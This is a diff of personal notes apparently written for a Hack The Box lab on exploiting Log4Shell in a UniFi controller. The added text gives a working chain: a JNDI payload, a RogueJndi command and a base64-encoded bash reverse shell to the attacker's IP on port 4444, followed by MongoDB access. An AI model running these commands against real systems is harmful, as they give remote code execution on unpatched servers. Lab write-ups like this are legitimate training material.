@@ -180,10 +180,19 @@ https://{IP_ADDRESS:8443
 
 ->unifi website 6.4.54, has an exploit, vulnerable to log4j rce attack CVE-2021-44228 (log4shell)
 
+#### The Log4Shell attack flow
+
+1. curl sends the payload to the target's login API. The payload contains a JNDI lookup string.
+2. The vulnerable application processes the input. If the relevant Log4j logging path evaluates the lookup, the target initiates an LDAP request to your RogueJndi server.
+3. RogueJndi responds to the LDAP lookup. It supplies a JNDI response configured to provide a command-related payload.
+4. The target processes the response. If the required Java and application conditions are met, the command executes on the target.
+5. The command contains your callback address. It specifies your Kali IP (10.10.14.95) and port (4444).
+6. Netcat receives the incoming TCP connection because it's listening on that port.
+
 -> we can use burp suite to try to make an ldap connection and see if its vulnerable by using tcpdump on port 
 
 ```bash
-
+sudo tcpdump -i tun0 -n port 1389
 ```
 
 -> then send a ldap connection request payload from burp suite
@@ -202,64 +211,29 @@ https://{IP_ADDRESS:8443
 - makes a dual server, malicious LDAP and HTTP, makes LDAP endpoint URLs and map them to a specific exploit technique for different vers and envs (tomcat, websphere, groovy)
 - vulnerable java app do a JNDI lookup on the generated LDAP URLs, RogueJNDI responds with a malicious reference or serialized object, and tricks server to fetch and executing the payload
 
+-> https://github.com/veracode-research/rogue-jndi
+-> from here we can clone and build the rogue jndi tool, then start crafting the interactive bash payload, encode it in base64
 
-Getting from callback → RCE
+```bash
+echo 'bash -c bash -i >&/dev/tcp/{YOUR_tun0_IP}/4444 0>&1' | base64
+```
 
-A bare LDAP listener (like tcpdump catching the hit, or even a plain nc -lvnp 389) only proves the callback — it can’t actually respond properly to complete the JNDI lookup. To get code execution you need an actual rogue LDAP server that redirects the client to load a malicious Java class from an HTTP server. That’s what tools like the JNDI Exploit Kit / marshalsec do for you.
-
-
-
-The Log4Shell attack flow
-
-1. curl sends the payload to the target's login API. The payload contains a JNDI lookup string.
-
-2. The vulnerable application processes the input. If the relevant Log4j logging path evaluates the lookup, the target initiates an LDAP request to your RogueJndi server.
-
-3. RogueJndi responds to the LDAP lookup. It supplies a JNDI response configured to provide a command-related payload.
-
-4. The target processes the response. If the required Java and application conditions are met, the command executes on the target.
-
-5. The command contains your callback address. It specifies your Kali IP (10.10.14.95) and port (4444).
-
-6. Netcat receives the incoming TCP connection because it's listening on that port.
-Two small corrections
-
-    Base64 is encoding, not hashing. Your command uses Base64 to represent the shell command in a different format.
-
-    The connection isn't redirected through RogueJndi. The target initiates a separate connection directly to your Kali machine.
-
-The most important concept to remember:
-
-RogueJndi delivers the JNDI response. The target executes the command. Netcat receives the resulting connection.
-
-You've now understood the relationship between the three components: curl, RogueJndi and Netcat.
+-> after encoding, run the java executable with your own hostname and hash
 
 
-vulnurable log4j unifi
+```bash
+java -jar rogue-jndi/target/RogueJndi-1.1.jar --command "bash -c {echo,HASH}|{base64,-d}|{bash,-i}" --hostname "{YOUR_tun0_IP}"
+```
 
-For an authorized HTB assessment:
+-> then set up netcat and then send the burp request again.
 
-    Application version: Identify the UniFi Network application version.
+-> boom! reverse shell!
 
-    Log4j version: Determine which Log4j library version is bundled with the application.
+-> you can find the mongo process by using `ps aux`, we find that it has port 27117
 
-    Affected configuration: Check whether the application uses the vulnerable lookup functionality.
-
-    Request handling: Establish whether the relevant input reaches the application's logging subsystem.
-
-    Evidence: Correlate application logs, LDAP traffic and server responses.
-
-whoami
-hostname
-uname -a
-pwd
-cat /etc/os-release
-
-
-ps aux 
-
-
-mongo has port 27117 
+```bash
+mongo --port 27117   --> connect to the mongodb
+```
 
 -> log in to mongo then enumerate all the collections and databases
 
